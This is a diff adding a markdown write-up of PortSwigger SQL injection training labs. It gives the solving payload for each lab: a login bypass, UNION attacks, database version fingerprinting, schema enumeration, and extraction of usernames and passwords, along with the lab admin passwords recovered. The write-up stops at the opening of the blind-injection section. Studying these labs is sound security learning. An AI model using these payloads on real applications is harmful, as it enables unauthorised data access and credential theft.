@@ -1,0 +1,114 @@
+# SQL Injection
+
+ - [Retrieving hidden data](#retrieving-hidden-data)
+ - [UNION attacks](#union-attacks)
+ - [Blind SQL injection](#blind-sql-injection)
+
+Details at [here](https://portswigger.net/web-security/sql-injection)
+
+Type of SQL injection in example
+
+- Retrieving hidden data
+- UNION attacks
+- Blind SQL injection
+
+## Retrieving hidden data
+
+Modify an SQL query to return additional results
+
+[Lab 1](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+
+Description of this lab: the query of 1 category `Gifts`
+
+`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+
+And sample URL query: `https://example.com/filter?category=Gifts`
+
+Goal: display details of all products in any category, both *released and unreleased*
+
+`SELECT * FROM products WHERE category = '' or '1'='1' AND released = 1`
+
+We just only adjust in `category=` and put into `''`, so the final payload:
+`' or '1'='1` or `https://example.com/filter?category=%27%20or%20%271%27or%271` 
+
+[Lab 2](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+
+Description of this lab: inject in login page as username: administrator
+
+So we need to modify the password, and check the password with the previous payload: `' or '1'='1`, and it worked
+
+## UNION attacks
+
+Detail found at [here](https://portswigger.net/web-security/sql-injection/union-attacks)
+
+See cheatsheet [here](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+[Lab 3](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+
+Description of this lab: vulnerability in the product category filter, use a UNION attack to retrieve data from other tables
+
+Firstly, we need to identify the number of columns in the table, and use payload: `' ORDER BY <number-of-column> --` to check, after we use `' ORDER BY 4 --`, we got the error `Internal Server Error` so the column is 3.
+
+Finally, we use `' UNION SELECT NULL, NULL, NULL--` to make a union attack at `/filter?category=` then solved this challenge.
+
+[Lab 4](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
+
+Description of this lab: You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. After that, alter NULL to random text on the homepage, for example: 'qG26iL'
+
+Do as same as the previous one with `' UNION SELECT NULL, NULL, NULL--`. After trying, the final payload is `' UNION SELECT NULL, 'qG26iL', NULL--`
+
+[Lab 5](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+
+Description of this lab: The database contains a different table called users, with columns called username and password
+
+In this lab, there are 2 columns in this table
+
+Do the same as the previous one with `' UNION SELECT NULL, NULL--`. Follow the description, and change NULL to username and password. Moreover, we need access to a table named `users`, so the payload is: `' UNION SELECT username, password FROM users--`, then we got all username and password.
+
+Login with the password of user `administrator`: nq3glruptcrilo0yscf6 and solved the lab.  
+
+[Lab 6](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
+
+This lab has the same description as the previous one but we need to retrieve multiple values in a single column. Furthermore, in this lab, we can use only the second column.
+
+Look at the cheatsheet, we can use the string concatenation technique. After trying, we found this lab use `||` for concatenate string. The final payload is `' UNION SELECT NULL, username||':'||password FROM users--` to get all usernames and passwords.
+
+Login with the password of user `administrator`: 532codf0er823llefy7x and solved the lab. 
+
+[Lab 7](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
+
+Description of this lab: display the database version string of Oracle
+
+In this lab, the available number of columns is 2. Look at the cheatsheet, try with: `SELECT banner FROM v$version` and the final payload is: `' UNION SELECT banner, NULL FROM v$version--`, then solved the lab.
+
+[Lab 8](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
+
+This lab has the same description as the previous one, but for MySQL and Microsoft.
+
+The final payload is `' UNION SELECT @@version, NULL#`, we will change `v$version` to `@@version`, `--` to `#`, then solved the lab.
+
+
+[Lab 9](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
+
+Description of this lab: You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+This lab has 2 available cloumns, we need to determine the name of table first. However, determine the version of database. After trying, `' UNION SELECT version(), NULL--` worked and result is `PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit`
+
+Check the cheatsheet, found database contents with PostgreSQL using `' UNION SELECT table_name, NULL FROM information_schema.tables--`. So there are a lot of tables, find the column of table `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ahngdj'--`, the result is colunms names: username_ivoiag and password_vxgmam
+
+The final payload is `' UNION SELECT username_ivoiag, password_vxgmam FROM users_ahngdj--`, the password of administrator is l9jw2he0g1jr5zzndr3o. Login with this password, then solved the lab.
+
+[Lab 10](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
+
+This lab has the same description as the previous one, but for oracle.
+
+Get all table name in database with `' UNION SELECT table_name, NULL FROM all_tables--`, and the name of table which we need to access is USERS_NOFLTA then use `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_NOFLTA'--` to get name of password and username column: PASSWORD_EVVZCC & USERNAME_ETTQUM.
+
+The final payload is: `' UNION SELECT USERNAME_ETTQUM, PASSWORD_EVVZCC FROM USERS_NOFLTA--` and get password of administrator is qhwrw9aos6k2p2uodezp, login and solved the lab.
+
+## Blind SQL injection 
+
+[Lab 11](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+Description of this lab: The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+
